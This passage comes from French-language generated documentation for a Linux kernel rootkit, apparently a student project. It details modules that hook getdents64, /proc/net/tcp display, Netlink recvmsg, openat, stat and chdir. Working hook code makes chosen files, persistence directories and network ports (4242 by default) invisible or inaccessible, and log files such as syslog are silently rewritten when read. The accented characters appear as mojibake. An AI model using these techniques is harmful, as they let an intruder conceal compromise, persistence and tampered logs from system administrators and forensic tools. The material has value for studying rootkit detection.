<div class="fragment"><div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#acb0c09923574d7984d200b1f81b5592e">hide_init</a>(<span class="keywordtype">void</span>);</div>
<div class="line"><span class="keywordtype">void</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a7f86593d38cb6146e826c45feb55ee2f">hide_exit</a>(<span class="keywordtype">void</span>);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a187cbdb4b2755a9436a0661bc40108fb">hide_file</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> *path);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#ac147abbca2116c29d3679c207b981a98">unhide_file</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> *path);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a4cee1335ac343be0d1d0b37e0269df04">hide_contains_str</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> *u_path);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a749f3d36be907a13b55ebe22f4fb170e">hide_list_get</a>(<span class="keywordtype">char</span> *buf, <span class="keywordtype">size_t</span> buf_size);</div>
<div class="line"> </div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a7f71b21f42e91eda68a5cc3ed612862b">hide_port_init</a>(<span class="keywordtype">void</span>);</div>
<div class="line"><span class="keywordtype">void</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#aa317d419cb750c43e067aece8a14702e">hide_port_exit</a>(<span class="keywordtype">void</span>);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a7f6495b2d1bb05a45b059523480121ab">hide_port</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> *<a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a>);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#aa8bc20d31dd04614a5b0c4e59c7ed540">unhide_port</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> *<a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a>);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a4142ebbb31991d3aae43ac6c26ea1318">port_contains</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> *<a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a>);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a5a3244673b55665a6128a2f187c75da3">port_list_get</a>(<span class="keywordtype">char</span> *buf, <span class="keywordtype">size_t</span> buf_size);</div>
<div class="ttc" id="aconfig_8h_html_a63c89c04d1feae07ca35558055155ffb"><div class="ttname"><a href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a></div><div class="ttdeci">int port</div><div class="ttdef"><b>Definition</b> <a href="../../d0/d29/main_8c_source.html#l00007">main.c:7</a></div></div>
<div class="ttc" id="ahide__api_8c_html_a187cbdb4b2755a9436a0661bc40108fb"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#a187cbdb4b2755a9436a0661bc40108fb">hide_file</a></div><div class="ttdeci">int hide_file(const char *path)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00025">hide_api.c:25</a></div></div>
<div class="ttc" id="ahide__api_8c_html_a4142ebbb31991d3aae43ac6c26ea1318"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#a4142ebbb31991d3aae43ac6c26ea1318">port_contains</a></div><div class="ttdeci">int port_contains(const char *port)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00118">hide_api.c:118</a></div></div>
<div class="ttc" id="ahide__api_8c_html_a4cee1335ac343be0d1d0b37e0269df04"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#a4cee1335ac343be0d1d0b37e0269df04">hide_contains_str</a></div><div class="ttdeci">int hide_contains_str(const char *u_path)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00066">hide_api.c:66</a></div></div>
<div class="ttc" id="ahide__api_8c_html_a5a3244673b55665a6128a2f187c75da3"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#a5a3244673b55665a6128a2f187c75da3">port_list_get</a></div><div class="ttdeci">int port_list_get(char *buf, size_t buf_size)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00122">hide_api.c:122</a></div></div>
<div class="ttc" id="ahide__api_8c_html_a749f3d36be907a13b55ebe22f4fb170e"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#a749f3d36be907a13b55ebe22f4fb170e">hide_list_get</a></div><div class="ttdeci">int hide_list_get(char *buf, size_t buf_size)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00070">hide_api.c:70</a></div></div>
<div class="ttc" id="ahide__api_8c_html_a7f6495b2d1bb05a45b059523480121ab"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#a7f6495b2d1bb05a45b059523480121ab">hide_port</a></div><div class="ttdeci">int hide_port(const char *port)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00090">hide_api.c:90</a></div></div>
<div class="ttc" id="ahide__api_8c_html_a7f71b21f42e91eda68a5cc3ed612862b"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#a7f71b21f42e91eda68a5cc3ed612862b">hide_port_init</a></div><div class="ttdeci">int hide_port_init(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00074">hide_api.c:74</a></div></div>
<div class="ttc" id="ahide__api_8c_html_a7f86593d38cb6146e826c45feb55ee2f"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#a7f86593d38cb6146e826c45feb55ee2f">hide_exit</a></div><div class="ttdeci">void hide_exit(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00020">hide_api.c:20</a></div></div>
<div class="ttc" id="ahide__api_8c_html_aa317d419cb750c43e067aece8a14702e"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#aa317d419cb750c43e067aece8a14702e">hide_port_exit</a></div><div class="ttdeci">void hide_port_exit(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00085">hide_api.c:85</a></div></div>
<div class="ttc" id="ahide__api_8c_html_aa8bc20d31dd04614a5b0c4e59c7ed540"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#aa8bc20d31dd04614a5b0c4e59c7ed540">unhide_port</a></div><div class="ttdeci">int unhide_port(const char *port)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00104">hide_api.c:104</a></div></div>
<div class="ttc" id="ahide__api_8c_html_ac147abbca2116c29d3679c207b981a98"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#ac147abbca2116c29d3679c207b981a98">unhide_file</a></div><div class="ttdeci">int unhide_file(const char *path)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00052">hide_api.c:52</a></div></div>
<div class="ttc" id="ahide__api_8c_html_acb0c09923574d7984d200b1f81b5592e"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#acb0c09923574d7984d200b1f81b5592e">hide_init</a></div><div class="ttdeci">int hide_init(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00009">hide_api.c:9</a></div></div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md84"></a>
4.1.2 Interception</h4>
<div class="fragment"><div class="line">asmlinkage int (*<a class="code hl_variable" href="../../de/deb/hide_8c.html#ac94011be5f0bbfd7f49bc58dfa342001">__orig_getdents64</a>)(<span class="keyword">const</span> <span class="keyword">struct </span>pt_regs *regs) = NULL;</div>
<div class="line">asmlinkage long (*<a class="code hl_variable" href="../../de/deb/hide_8c.html#ac44c2733f8af7c2c57ab9bba3e85835c">__orig_tcp4_seq_show</a>)(<span class="keyword">struct </span>seq_file *seq, <span class="keywordtype">void</span> *v) = NULL;</div>
<div class="line">asmlinkage long (*<a class="code hl_variable" href="../../de/deb/hide_8c.html#a6f6985ce4f31df32aa9a0466826796ed">__orig_tcp6_seq_show</a>)(<span class="keyword">struct </span>seq_file *seq, <span class="keywordtype">void</span> *v) = NULL;</div>
<div class="line">asmlinkage long (*<a class="code hl_variable" href="../../de/deb/hide_8c.html#a9a588e3d7a442f79438c99ae9c46b6cf">__orig_recvmsg</a>)(<span class="keyword">const</span> <span class="keyword">struct </span>pt_regs *regs) = NULL;</div>
</div><!-- fragment --><p> Le fichier <code><a class="el" href="../../de/deb/hide_8c.html">hide.c</a></code> contient lâ€™ensemble des hooks gÃ©rÃ©s, et donc la dÃ©claration des pointeurs vers les fonctions noyau dâ€™origine. Pour ce qui est de lâ€™appel systÃ¨me <code>getdents64</code>, il est utilisÃ© par la plupart des appels de type <code>readdir()</code> ou <code>ls</code> et permet de lister dans un buffer lâ€™ensemble des entrÃ©es dâ€™un rÃ©pertoire. Lâ€™interception de cet appel et sa redirection vers la fonction <code>getdents64_hook</code> nous permettent ainsi de masquer spÃ©cifiquement certains fichiers et rÃ©pertoires. Ce hook est notamment utilisÃ© pour dissimuler des dossiers de processus dans <code>/proc/</code>, comme ceux liÃ©s aux threads de communication rÃ©seau pour les protocoles DNS et TCP. Il est aussi utile pour cacher les fichiers liÃ©s Ã  la persistance du rootkit ainsi que ceux relatifs aux Ã©lÃ©ments de configuration dans <code>/var/lib/systemd/.epirootkit-hidden-fs</code>. </p><div class="fragment"><div class="line">victim@victim$ strace ls</div>
<div class="line">execve(&quot;/sbin/ls&quot;, [&quot;ls&quot;], 0x7ffe4be49b00 /* 106 vars */) = 0</div>
<div class="line">...</div>
<div class="line">fstat(3, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0</div>
<div class="line">getdents64(3, 0x5bb6802fc6f0 /* 13 entries */, 32768) = 376</div>
<div class="line">getdents64(3, 0x5bb6802fc6f0 /* 0 entries */, 32768) = 0</div>
<div class="line">close(3) = 0</div>
<div class="line">...</div>
</div><!-- fragment --><p> Par ailleurs, les fonctions <code>tcp4_seq_show_hook</code> et <code>tcp6_seq_show_hook</code> interceptent respectivement lâ€™affichage des entrÃ©es dans <code>/proc/net/tcp</code> et <code>/proc/net/tcp6</code>. En les dÃ©tournant, il devient possible de masquer certaines connexions rÃ©seau et sockets ouverts, en fonction de ports source/destination spÃ©cifiÃ©s. Ces deux fonction sont d'ailleurs exportÃ©es dans la table de symboles du noyau (<code>/proc/kallsyms</code>), ce qui signifie quâ€™il est bien possible, au chargement du module, de rÃ©cupÃ©rer leur adresse exacte en mÃ©moire au moyen dâ€™un appel Ã  <code>kallsyms_lookup_name()</code>. </p><div class="fragment"><div class="line">victim@victim$ cat /proc/kallsyms | grep tcp[46]_seq_show</div>
<div class="line">0000000000000000 t __pfx_tcp4_seq_show</div>
<div class="line">0000000000000000 t tcp4_seq_show</div>
<div class="line">0000000000000000 t __pfx_tcp6_seq_show</div>
<div class="line">0000000000000000 t tcp6_seq_show</div>
</div><!-- fragment --><p> Enfin, lâ€™interception de la fonction <code>recvmsg</code> permet de filtrer les dumps Netlink utilisÃ©s par des outils comme <code>ss</code>, <code>netstat</code>, etc. Ces programmes nâ€™accÃ¨dent pas directement aux fichiers mentionnÃ©s prÃ©cÃ©demment, mais communiquent via une socket Netlink de type <code>NETLINK_SOCK_DIAG</code>. Ainsi, pour masquer Ã©galement ces connexions, la fonction <code>recvmsg_hook</code> intercepte lâ€™appel systÃ¨me <code>recvmsg</code>, vÃ©rifie si la socket utilisÃ©e est bien de type <code>netlink-diag</code>, puis teste si les ports source ou destination figurent dans notre liste de ports Ã  cacher <code>hide_port_list</code>. Le port <b>4242</b> est cachÃ© par dÃ©faut.</p>
<h3><a class="anchor" id="autotoc_md85"></a>
4.2 ğŸš« forbid</h3>
<p>La partie <em>forbid</em> du rootkit a pour objectif dâ€™interdire lâ€™accÃ¨s Ã  certains fichiers ou rÃ©pertoires. ConcrÃ¨tement, elle intercepte les appels systÃ¨mes de type <code>openat</code>, <code>stat</code> (et variantes), et <code>chdir</code> pour renvoyer une erreur dÃ¨s quâ€™un chemin Ã  <em>interdire</em> est dÃ©tectÃ©. Les fichiers par dÃ©faut incluent notamment les fichiers de configuration ainsi que les rÃ©pertoires liÃ©s Ã  la persistance.</p>
<h4><a class="anchor" id="autotoc_md86"></a>
4.2.1 Structures</h4>
<p>Le mÃ©canisme de filtrage repose sur une unique instance de la structure ulist, dÃ©finie dans utils/ulist.c, exactement comme prÃ©cÃ©demment... Cette liste conserve, sous forme de chaÃ®nes de chemins absolus, tous les fichiers ou rÃ©pertoires auxquels on souhaite interdire lâ€™accÃ¨s. Les fonctions exposÃ©es dans <a class="el" href="../../d9/d2a/forbid__api_8h.html">forbid_api.h</a> permettent de gÃ©rer dynamiquement cette liste : </p><div class="fragment"><div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../dc/dd8/forbid__api_8c.html#ac21a06c0dcb0600683918829b7ac3d10">forbid_init</a>(<span class="keywordtype">void</span>);</div>
<div class="line"><span class="keywordtype">void</span> <a class="code hl_function" href="../../dc/dd8/forbid__api_8c.html#ab44d05c0612861c5ed09b656c596d049">forbid_exit</a>(<span class="keywordtype">void</span>);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../dc/dd8/forbid__api_8c.html#a0bce1b2093df71ccb2cff9de2b21fcec">forbid_file</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> *path);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../dc/dd8/forbid__api_8c.html#a3375f3889e7c8a41e9501679ca0774ec">unforbid_file</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> *path);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../dc/dd8/forbid__api_8c.html#a84083ca2e706c78fc7e253c71d0501aa">forbid_contains</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> __user *u_path);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../dc/dd8/forbid__api_8c.html#a953ca13849c5b009d88bf58e37055ad2">forbid_list_get</a>(<span class="keywordtype">char</span> *buf, <span class="keywordtype">size_t</span> buf_size);</div>
<div class="ttc" id="aforbid__api_8c_html_a0bce1b2093df71ccb2cff9de2b21fcec"><div class="ttname"><a href="../../dc/dd8/forbid__api_8c.html#a0bce1b2093df71ccb2cff9de2b21fcec">forbid_file</a></div><div class="ttdeci">int forbid_file(const char *path)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dd8/forbid__api_8c_source.html#l00024">forbid_api.c:24</a></div></div>
<div class="ttc" id="aforbid__api_8c_html_a3375f3889e7c8a41e9501679ca0774ec"><div class="ttname"><a href="../../dc/dd8/forbid__api_8c.html#a3375f3889e7c8a41e9501679ca0774ec">unforbid_file</a></div><div class="ttdeci">int unforbid_file(const char *path)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dd8/forbid__api_8c_source.html#l00051">forbid_api.c:51</a></div></div>
<div class="ttc" id="aforbid__api_8c_html_a84083ca2e706c78fc7e253c71d0501aa"><div class="ttname"><a href="../../dc/dd8/forbid__api_8c.html#a84083ca2e706c78fc7e253c71d0501aa">forbid_contains</a></div><div class="ttdeci">int forbid_contains(const char __user *u_path)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dd8/forbid__api_8c_source.html#l00081">forbid_api.c:81</a></div></div>
<div class="ttc" id="aforbid__api_8c_html_a953ca13849c5b009d88bf58e37055ad2"><div class="ttname"><a href="../../dc/dd8/forbid__api_8c.html#a953ca13849c5b009d88bf58e37055ad2">forbid_list_get</a></div><div class="ttdeci">int forbid_list_get(char *buf, size_t buf_size)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dd8/forbid__api_8c_source.html#l00106">forbid_api.c:106</a></div></div>
<div class="ttc" id="aforbid__api_8c_html_ab44d05c0612861c5ed09b656c596d049"><div class="ttname"><a href="../../dc/dd8/forbid__api_8c.html#ab44d05c0612861c5ed09b656c596d049">forbid_exit</a></div><div class="ttdeci">void forbid_exit(void)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dd8/forbid__api_8c_source.html#l00019">forbid_api.c:19</a></div></div>
<div class="ttc" id="aforbid__api_8c_html_ac21a06c0dcb0600683918829b7ac3d10"><div class="ttname"><a href="../../dc/dd8/forbid__api_8c.html#ac21a06c0dcb0600683918829b7ac3d10">forbid_init</a></div><div class="ttdeci">int forbid_init(void)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dd8/forbid__api_8c_source.html#l00008">forbid_api.c:8</a></div></div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md87"></a>
4.2.2 Interception</h4>
<div class="fragment"><div class="line">asmlinkage long (*<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#a6ad11cda928e1900c9695739b9031986">__orig_openat</a>)(<span class="keyword">const</span> <span class="keyword">struct </span>pt_regs *) = NULL;</div>
<div class="line">asmlinkage long (*<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#abc34c3e67683e701614f5ba8bad72be0">__orig_newfstatat</a>)(<span class="keyword">const</span> <span class="keyword">struct </span>pt_regs *) = NULL;</div>
<div class="line">asmlinkage long (*<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#ada76679bffc7821d9893455db4813201">__orig_fstat</a>)(<span class="keyword">const</span> <span class="keyword">struct </span>pt_regs *) = NULL;</div>
<div class="line">asmlinkage long (*<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#a7701cf8c8631b444abe7ba78428a7ee4">__orig_lstat</a>)(<span class="keyword">const</span> <span class="keyword">struct </span>pt_regs *) = NULL;</div>
<div class="line">asmlinkage long (*<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#ae32e5cb44540533f60b81e4ae52e859f">__orig_stat</a>)(<span class="keyword">const</span> <span class="keyword">struct </span>pt_regs *) = NULL;</div>
<div class="line">asmlinkage long (*<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#a2ce752d9cf8f54043f9a858f3c905eae">__orig_chdir</a>)(<span class="keyword">const</span> <span class="keyword">struct </span>pt_regs *regs) = NULL;</div>
<div class="line">asmlinkage long (*<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#a787b39a7dadfb499e9dae3ae2feab12e">__orig_ptrace</a>)(<span class="keyword">const</span> <span class="keyword">struct </span>pt_regs *regs) = NULL;</div>
<div class="ttc" id="aforbid_8c_html_a787b39a7dadfb499e9dae3ae2feab12e"><div class="ttname"><a href="../../dc/dfc/forbid_8c.html#a787b39a7dadfb499e9dae3ae2feab12e">__orig_ptrace</a></div><div class="ttdeci">asmlinkage long(* __orig_ptrace)(const struct pt_regs *regs)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dfc/forbid_8c_source.html#l00011">forbid.c:11</a></div></div>
</div><!-- fragment --><p>Toutes les interceptions sont dÃ©clarÃ©es et implÃ©mentÃ©es dans <a class="el" href="../../dc/dfc/forbid_8c.html">forbid.c</a>. On y trouve, dans un premier temps, les pointeurs vers les fonctions noyau dâ€™origine, qui seront sauvegardÃ©s au moment de lâ€™installation des hooks. Pour ce qui est de la fonction <code>openat</code> (appelÃ©e via <code>sys_openat</code>), elle est utilisÃ©e pour ouvrir un fichier ou crÃ©er un lien. Dans notre hook, on rÃ©cupÃ¨re lâ€™argument <code>pathname</code> passÃ© par lâ€™espace utilisateur depuis le registre <code>regs-&gt;si</code>. </p><div class="fragment"><div class="line">asmlinkage <span class="keywordtype">long</span> notrace <a class="code hl_function" href="../../dc/dfc/forbid_8c.html#ae57c99a859f85f46bca995e81dd73c33">openat_hook</a>(<span class="keyword">const</span> <span class="keyword">struct</span> pt_regs *regs) {</div>
<div class="line">    <span class="keyword">const</span> <span class="keywordtype">char</span> __user *u_path = (<span class="keyword">const</span> <span class="keywordtype">char</span> __user *)regs-&gt;si;</div>
<div class="line">    <span class="keywordflow">if</span> (<a class="code hl_function" href="../../dc/dd8/forbid__api_8c.html#a84083ca2e706c78fc7e253c71d0501aa">forbid_contains</a>(u_path))</div>
<div class="line">        <span class="keywordflow">return</span> -ENOENT;</div>
<div class="line">    <span class="keywordflow">return</span> <a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#a6ad11cda928e1900c9695739b9031986">__orig_openat</a>(regs);</div>
<div class="line">}</div>
</div><!-- fragment --> <div class="fragment"><div class="line">root@victim# cat /etc/secret.conf</div>
<div class="line">cat: /etc/secret.conf: No such file or directory</div>
</div><!-- fragment --><p> Ainsi, si le chemin est interdit, le hook renvoie <code>-ENOENT</code>, ce qui fait croire au processus quâ€™il nâ€™existe pas ! Dans le cas contraire, on invoque ici <code><a class="el" href="../../dc/dfc/forbid_8c.html#a6ad11cda928e1900c9695739b9031986">__orig_openat(regs)</a></code> pour ouvrir le fichier normalement. Par ailleurs, de nombreux utilitaires reposent sur la famille dâ€™appels systÃ¨mes <code>stat</code>, <code>lstat</code>, <code>fstat</code> et <code>newfstatat</code> pour obtenir les mÃ©tadonnÃ©es dâ€™un fichier (permissions, taille, propriÃ©taire, etc.). PlutÃ´t que dâ€™installer quatre hooks sÃ©parÃ©s, nous avons regroupÃ© lâ€™interception de ces quatre appels dans une unique fonction <code>stat_hook</code>, qui examine <code>orig_ax</code> pour rediriger vers la fonction dâ€™origine appropriÃ©e dans la fonction <a class="el" href="../../dc/dfc/forbid_8c.html#ac71e6b72dd491c3ff7b0334e1f388f44">stat_hook(const struct pt_regs *regs)</a>. Enfin, lâ€™appel systÃ¨me <code>chdir</code> permet Ã  un processus de changer son rÃ©pertoire de travail courant. Si lâ€™on veut empÃªcher un utilisateur ou un script de sâ€™avancer dans un dossier jugÃ© sensible, on intercepte aussi <code>chdir</code> et on bloque le changement de dossier dÃ¨s que le chemin se trouve dans la liste <code>forbid_list</code>. </p><div class="fragment"><div class="line">asmlinkage <span class="keywordtype">long</span> notrace <a class="code hl_function" href="../../dc/dfc/forbid_8c.html#a6952f779f1ad4e597903ebc4e7b4cdc2">chdir_hook</a>(<span class="keyword">const</span> <span class="keyword">struct</span> pt_regs *regs) {</div>
<div class="line">    <span class="keyword">const</span> <span class="keywordtype">char</span> __user *u_path = (<span class="keyword">const</span> <span class="keywordtype">char</span> __user *)regs-&gt;di;</div>
<div class="line">    <span class="keywordflow">if</span> (<a class="code hl_function" href="../../dc/dd8/forbid__api_8c.html#a84083ca2e706c78fc7e253c71d0501aa">forbid_contains</a>(u_path))</div>
<div class="line">        <span class="keywordflow">return</span> -ENOENT;</div>
<div class="line">    <span class="keywordflow">return</span> <a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#a2ce752d9cf8f54043f9a858f3c905eae">__orig_chdir</a>(regs);</div>
<div class="line">}</div>
</div><!-- fragment --><h3><a class="anchor" id="autotoc_md88"></a>
4.3 ğŸ§¬ alterate</h3>
<p>La partie <em>alterate</em> du rootkit permet de modifier Ã  la volÃ©e le contenu des fichiers lus par un processus, en se basant sur des rÃ¨gles dÃ©finies pour chaque chemin. DÃ¨s quâ€™un appel Ã  <code>read</code> est interceptÃ© sur un <em>file descriptor</em> dont le chemin figure dans la liste des fichiers Ã  altÃ©rer, on peut soit masquer une ligne prÃ©cise, soit masquer toute ligne contenant un certain mot clef, ou soit remplacer une sous-chaÃ®ne par une autre dans chaque ligne retournÃ©e. Cette fonctionnalitÃ© est dynamique, mais doit Ãªtre utilisÃ©e avec prÃ©caution, car il nâ€™est pas toujours garanti que les Ã©lÃ©ments basÃ©s sur les numÃ©ros de ligne fonctionnent de maniÃ¨re fiable (hehe).</p>
<h4><a class="anchor" id="autotoc_md89"></a>
4.3.1 Structures</h4>
<p>Le cÅ“ur du mÃ©canisme dâ€™alteration repose sur la structure <code>alt_list</code>, dÃ©finie et gÃ©rÃ©e dans <a class="el" href="../../d1/d5c/alterate__api_8c.html">alterate_api.c</a>. Cette liste stocke les chemins des fichiers Ã  surveiller, associÃ©e Ã  un payload textuel codant la rÃ¨gle dâ€™altÃ©ration. Chaque Ã©lÃ©ment de <code>alt_list</code> correspond Ã  un enregistrement de configuration dont la clÃ© <code>value</code> est le chemin absolu du fichier, et dont le payload est une chaÃ®ne au format suivant : </p><div class="fragment"><div class="line">&lt;value&gt; | &lt;flags&gt; | &lt;numero_de_ligne&gt;:&lt;mot_clef_a_masquer_lol&gt;:&lt;src_substr&gt;:&lt;dst_substr&gt;</div>
</div><!-- fragment --><p> En effet, un Ã©lÃ©ment de liste dans <a class="el" href="../../de/d0a/ulist_8c.html">ulist.c</a> a la structure suivante : </p><div class="fragment"><div class="line">struct ulist_item {</div>
<div class="line">    char *value;</div>
<div class="line">    u32 flags;</div>
<div class="line">    char *payload;</div>
<div class="line">    struct list_head list;</div>
<div class="line">};</div>
</div><!-- fragment --><p> Ainsi par exemple, si la ligne de configuration contient <code>/var/log/syslog|0|10:claire:efrei:epita</code>, on aura dans le fichier <code>/var/log/syslog</code> (avec un certes un flag de 0, mais que finalement nous n'utilisons jamais...) :</p><ul>
<li>La dixiÃ¨me ligne sera cachÃ©e.</li>
<li>Toutes les lignes contenant le mot <em>claire</em> disparaÃ®tront.</li>
<li>Toutes les occurrences de <em>efrei</em> seront remplacÃ©es par <em>epita</em>.</li>
</ul>
<p>Le fichier <a class="el" href="../../dc/d93/alterate__api_8h.html">alterate_api.h</a> expose par ailleurs lâ€™API de gestion de cette configuration : </p><div class="fragment"><div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d1/d5c/alterate__api_8c.html#a08a4517ed2ff9e2445767a9b2109f5b7">alterate_init</a>(<span class="keywordtype">void</span>);</div>
<div class="line"><span class="keywordtype">void</span> <a class="code hl_function" href="../../d1/d5c/alterate__api_8c.html#aad1f9731cb2b27fb7cb0071852bc1448">alterate_exit</a>(<span class="keywordtype">void</span>);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d1/d5c/alterate__api_8c.html#a5bcebcf0d68b7859bead40dc9ce14d2b">alterate_add</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> *path, <span class="keywordtype">int</span> hide_line, <span class="keyword">const</span> <span class="keywordtype">char</span> *hide_substr, <span class="keyword">const</span> <span class="keywordtype">char</span> *src, <span class="keyword">const</span> <span class="keywordtype">char</span> *dst);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d1/d5c/alterate__api_8c.html#aa4a743f9e11442e388e60faa6ef0dd83">alterate_remove</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> *path);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d1/d5c/alterate__api_8c.html#a56d2435116b06d7b18dafbd0a9e8f21c">alterate_contains</a>(<span class="keyword">const</span> <span class="keywordtype">char</span> __user *u_path);</div>
<div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d1/d5c/alterate__api_8c.html#ade89215d4548cc5e7640d0ea38e25c83">alterate_list_get</a>(<span class="keywordtype">char</span> *buf, <span class="keywordtype">size_t</span> buf_size);</div>
<div class="ttc" id="aalterate__api_8c_html_a08a4517ed2ff9e2445767a9b2109f5b7"><div class="ttname"><a href="../../d1/d5c/alterate__api_8c.html#a08a4517ed2ff9e2445767a9b2109f5b7">alterate_init</a></div><div class="ttdeci">int alterate_init(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d1/d5c/alterate__api_8c_source.html#l00008">alterate_api.c:8</a></div></div>
<div class="ttc" id="aalterate__api_8c_html_a56d2435116b06d7b18dafbd0a9e8f21c"><div class="ttname"><a href="../../d1/d5c/alterate__api_8c.html#a56d2435116b06d7b18dafbd0a9e8f21c">alterate_contains</a></div><div class="ttdeci">int alterate_contains(const char __user *u_path)</div><div class="ttdef"><b>Definition</b> <a href="../../d1/d5c/alterate__api_8c_source.html#l00069">alterate_api.c:69</a></div></div>
<div class="ttc" id="aalterate__api_8c_html_a5bcebcf0d68b7859bead40dc9ce14d2b"><div class="ttname"><a href="../../d1/d5c/alterate__api_8c.html#a5bcebcf0d68b7859bead40dc9ce14d2b">alterate_add</a></div><div class="ttdeci">int alterate_add(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst)</div><div class="ttdef"><b>Definition</b> <a href="../../d1/d5c/alterate__api_8c_source.html#l00023">alterate_api.c:23</a></div></div>
<div class="ttc" id="aalterate__api_8c_html_aa4a743f9e11442e388e60faa6ef0dd83"><div class="ttname"><a href="../../d1/d5c/alterate__api_8c.html#aa4a743f9e11442e388e60faa6ef0dd83">alterate_remove</a></div><div class="ttdeci">int alterate_remove(const char *path)</div><div class="ttdef"><b>Definition</b> <a href="../../d1/d5c/alterate__api_8c_source.html#l00055">alterate_api.c:55</a></div></div>
<div class="ttc" id="aalterate__api_8c_html_aad1f9731cb2b27fb7cb0071852bc1448"><div class="ttname"><a href="../../d1/d5c/alterate__api_8c.html#aad1f9731cb2b27fb7cb0071852bc1448">alterate_exit</a></div><div class="ttdeci">void alterate_exit(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d1/d5c/alterate__api_8c_source.html#l00018">alterate_api.c:18</a></div></div>
